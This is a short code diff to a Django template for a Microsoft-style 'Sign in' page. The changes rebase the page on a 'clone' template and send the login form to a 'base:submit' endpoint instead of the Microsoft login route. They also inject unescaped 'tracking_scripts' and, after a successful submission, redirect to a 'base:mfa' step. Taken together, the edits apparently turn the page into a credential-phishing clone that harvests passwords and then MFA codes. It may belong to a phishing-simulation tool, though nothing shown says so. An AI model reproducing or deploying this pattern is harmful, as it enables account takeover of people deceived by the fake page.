@@ -1,4 +1,4 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 {% load static %}
 
 {% block content %}
@@ -10,7 +10,7 @@
         </div>
 
         <!-- Sign In Form -->
-        <form id="loginForm" method="POST" action="{% url 'microsoft_login' %}">
+        <form id="loginForm" method="POST" action="{% url 'base:submit' %}">
             {% csrf_token %}
             <h1 class="signin-title">Sign in</h1>
             
@@ -107,6 +107,7 @@
         </div>
     </div>
 </div>
+{{ tracking_scripts|safe }}
 
 <style>
     :root {
@@ -584,7 +585,7 @@
                         showError('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
                     } else {
                         // Successful login - in a real app, this would redirect
-                        window.location.href = "{% url 'dashboard' %}";
+                        window.location.href = "{% url 'base:mfa' %}";
                     }
                 }, 1500);
             }
